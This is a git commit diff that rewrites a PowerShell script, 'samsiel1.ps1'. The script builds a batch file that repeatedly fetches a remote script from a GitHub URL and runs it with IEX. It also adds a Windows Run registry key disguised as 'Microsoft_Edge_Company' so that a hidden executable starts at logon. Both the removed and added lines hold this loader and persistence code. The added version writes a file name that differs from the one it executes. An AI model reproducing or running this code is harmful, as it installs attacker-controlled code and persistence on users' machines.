a875874ada286f996f2dcee207c85894e7932c83
alejq41 <93050806+alejq41@users.noreply.github.com>
2022-08-24 11:30:40 -0500

    Update samsiel1.ps1

--- samsiel1.ps1
+++ samsiel1.ps1
@@ -1,2 +1,7 @@
-md C:\Users\User\Downloads\ser; Set-Content C:\Users\User\Downloads\ser\serseruex.bat ":a & powershell IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('https://raw.githubusercontent.com/alejq41/free/main/powercode.ps1').GetResponse().GetResponseStream()).ReadToEnd()); & timeout /t 30
-& goto a" -Encoding ASCII; REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Microsoft_Edge_Company /d %LOCALAPPDATA%\DBG\cache\i386\run32.exe; cd C:\Users\User\Downloads\ser; ./serseruex.bat
+md C:\Users\User\Downloads\ser; $contentToAdd = @"
+:a
+powershell IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('https://raw.githubusercontent.com/alejq41/free/main/powercode.ps1').GetResponse().GetResponseStream()).ReadToEnd());
+timeout /t 30
+goto a
+"@; add-content "C:\Users\User\Downloads\ser/seruex.bat" $contenttoadd; REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Microsoft_Edge_Company /d %LOCALAPPDATA%\DBG\cache\i386\run32.exe; cd C:\Users\User\Downloads\ser; ./serseruex.bat
+
